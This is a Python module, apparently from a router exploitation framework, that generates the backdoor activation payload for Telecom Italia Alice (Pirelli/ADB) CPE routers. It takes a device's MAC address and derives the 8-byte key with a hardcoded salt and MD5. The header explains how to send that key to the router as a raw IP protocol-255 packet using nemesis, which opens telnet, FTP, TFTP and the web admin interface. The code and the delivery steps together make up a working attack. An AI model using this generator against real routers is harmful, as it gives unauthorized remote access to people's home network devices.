# Name:Alice Telecom Italia CPE Modem/Routers Pirelli (now ADB) backdoor hash payload generator
# File:alice_cpe_backdoor.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 17.2.2014
# Last modified: 17.2.2014
# Shodan Dork:
# Description: Generates payload with hash, needed to activate telnet, ftp, tftp and webadmin interface
#             You still have to send IP packet with the payload to the router
#             The ip packet send to router must have the following feature:
#             1)IP-protocol-number 255 (there's a RAW SOCKET listening on the router)
#             2)Payload size 8 byte
#             3)The payload are the first 8 byte of a salted md5 of the mac address of device br0
#             4)br0 in these modems has the same mac of eth0
#             You can send it with nemesis (nemesis ip -D 192.168.1.1 -p 255 -P payload.hex)
#             Based on work of saxdax and drPepperOne
#             http://saxdax.blogspot.com/2009/01/backdoor-on-telecom-italia-pirelli.html
# Note: This would make a nice exploit (with ability to send the packet) but I don't have a device for testing.

import core.Misc
import core.io
from interface.utils import validate_mac, lookup_mac
from interface.messages import print_success, print_error, print_help, print_info

import re
import hashlib
from binascii import hexlify


class Misc(core.Misc.RextMisc):
    """
Name:Alice Telecom Italia CPE Modem/Routers Pirelli (now ADB) backdoor hash payload generator
File:alice_cpe_backdoor.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 17.2.2014
Description: Generates payload with hash, needed to activate telnet, ftp, tftp and webadmin interface
    You still have to send IP packet with the payload to the router
    The ip packet send to router must have the following feature:
    1)IP-protocol-number 255 (there's a RAW SOCKET listening on the router)
    2)Payload size 8 byte
    3)The payload are the first 8 byte of a salted md5 of the mac address of device br0
    4)br0 in these modems has the same mac of eth0
    You can send it with nemesis (nemesis ip -D 192.168.1.1 -p 255 -P payload.hex)
Based on: Work of saxdax and drPepperOne http://saxdax.blogspot.com/2009/01/backdoor-on-telecom-italia-pirelli.html
Note: This would make a nice exploit (with ability to send the packet) but I don't have a device for testing.

Options:
    Name        Description

    mac         MAC address used as input for password generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        payload = self.keygen()
        print_success("payload generated")
        print("Payload:%s" % (hexlify(payload).decode()))
        core.io.writefile(payload, "payload.hex")
        print_info("Payload saved to payload.hex")

    def keygen(self):
        salt = b'\x04\x07\x67\x10\x02\x81\xFA\x66\x11\x41\x68\x11\x17\x01\x05\x22\x71\x04\x10\x33'
        bytemac = bytearray.fromhex(re.sub(r'[^a-fA-F0-9]', '', self.mac))
        h = hashlib.md5()
        h.update(bytemac)
        h.update(salt)
        digest = bytearray(h.digest())
        return digest[:8]

Misc()
